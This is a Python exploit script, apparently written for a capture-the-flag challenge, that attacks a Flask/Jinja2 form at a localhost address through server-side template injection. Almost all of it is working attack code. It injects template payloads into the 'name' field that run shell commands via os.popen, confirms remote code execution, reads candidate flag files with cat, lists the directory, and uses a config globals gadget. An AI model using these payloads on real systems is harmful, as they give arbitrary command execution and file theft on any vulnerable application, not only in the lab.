import requests
import re
import html
import sys

def send_payload(payload):
    """Send SSTI payload to target and return response text."""
    url = "http://127.0.0.1:33126/submit"
    data = {'name': payload, 'email': 'test@example.com', 'license': 'D123456'}
    
    try:
        resp = requests.post(url, data=data, timeout=5)
        if resp.status_code == 200:
            return resp.text
        else:
            print(f"[!] HTTP {resp.status_code}")
            return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_output(html_text):
    """Extract command output from HTML response."""
    match = re.search(r'Thank you (.*?) for your submission', html_text, re.DOTALL)
    return html.unescape(match.group(1)).strip() if match else None

def extract_flag(text):
    """Search for FLAG{...} pattern."""
    match = re.search(r'FLAG\{[^}]+\}', text)
    return match.group(0) if match else None

def test_rce():
    """Confirm RCE works."""
    print("[+] Testing RCE...")
    payload = '{{ __import__("os").popen("echo TEST123").read() }}'
    resp = send_payload(payload)
    if resp and 'TEST123' in extract_output(resp):
        print("[+] RCE confirmed!")
        return True
    print("[!] RCE test failed")
    return False

def find_flag():
    """Search for flag using multiple methods."""
    print("\n[+] Searching for flag files...")
    
    # Test common flag locations
    paths = ['/flag.txt', '/app/flag.txt', './flag.txt', '/tmp/flag.txt']
    for path in paths:
        payload = f'{{{{ __import__("os").popen("cat {path}").read() }}}}'
        resp = send_payload(payload)
        if resp:
            content = extract_output(resp)
            if content and 'No such file' not in content:
                flag = extract_flag(content)
                if flag:
                    print(f"[!] FLAG FOUND: {flag}")
                    return flag, payload
    
    # List directory and find txt files
    print("[+] Listing directory...")
    list_payload = '{{ __import__("os").popen("ls -la").read() }}'
    resp = send_payload(list_payload)
    if resp:
        files = extract_output(resp)
        print(f"[+] Files:\n{files}")
        
        if 'flag' in files:
            for line in files.split('\n'):
                if 'flag' in line and '.txt' in line:
                    filename = line.split()[-1]
                    read_payload = f'{{{{ __import__("os").popen("cat {filename}").read() }}}}'
                    resp2 = send_payload(read_payload)
                    if resp2:
                        content = extract_output(resp2)
                        flag = extract_flag(content)
                        if flag:
                            print(f"[!] FLAG FOUND: {flag}")
                            return flag, read_payload
    
    # Check Flask config
    print("\n[+] Checking config...")
    config_payload = '{{ config.__class__.__init__.__globals__.os.popen("cat /flag.txt").read() }}'
    resp = send_payload(config_payload)
    if resp:
        content = extract_output(resp)
        flag = extract_flag(content)
        if flag:
            print(f"[!] FLAG FOUND: {flag}")
            return flag, config_payload
    
    return None, None

def main():
    print("[+] SSTI Exploitation Script")
    print("[+] Target: http://127.0.0.1:33126/submit")
    print("[+] Injection: name parameter\n")
    
    if not test_rce():
        sys.exit(1)
    
    flag, payload = find_flag()
    if flag:
        print(f"\n[!] SUCCESS!")
        print(f"[!] Flag: {flag}")
        print(f"[!] Payload: {payload}")
    else:
        print("\n[!] Flag not found")

if __name__ == '__main__':
    main()
